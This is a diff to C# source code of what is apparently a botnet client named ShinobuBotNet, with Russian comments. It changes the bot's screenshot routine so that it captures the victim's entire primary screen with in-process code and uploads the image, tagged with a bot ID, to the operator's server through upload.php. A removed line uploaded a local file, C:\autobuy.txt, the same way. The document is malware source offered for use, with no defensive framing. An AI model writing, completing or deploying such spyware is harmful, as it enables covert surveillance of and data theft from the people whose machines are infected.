@@ -1,7 +1,9 @@
 ﻿using System.Diagnostics;
+using System.Drawing;
 using System.Net;
 using System.Threading;
 using System.Windows;
+using System.Windows.Forms;
 
 namespace ShinobuBotNet
 {
@@ -81,14 +83,16 @@ namespace ShinobuBotNet
             Thread thr = new Thread(() =>
             {
                 //делаем скрин
-                ProcessStartInfo psi;
                 string file_name = "screnshot.jpg";
-                psi = new ProcessStartInfo("cmd", @"inferno.exe DESKTOP_SCREENSHOT " + file_name + "");
-                Process.Start(psi);
+                Graphics graph = null;
+                var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                graph = Graphics.FromImage(bmp);
+                graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
+                bmp.Save(file_name); ;
                 //отправка файла
                 System.Net.WebClient Client = new System.Net.WebClient();
                 Client.Headers.Add("png/jpg", "binary/octet-stream");
-                byte[] result = Client.UploadFile(configs.server + "upload.php", "POST", @"C:\autobuy.txt");
+                byte[] result = Client.UploadFile(configs.server + "upload.php?id=" + API.Get_ID(), "POST", file_name);
             });
 
         }
@@ -96,7 +100,7 @@ namespace ShinobuBotNet
 
         public static void MSG(string text)
         {
-            MessageBox.Show(text);
+            System.Windows.MessageBox.Show(text);
         }
 
 
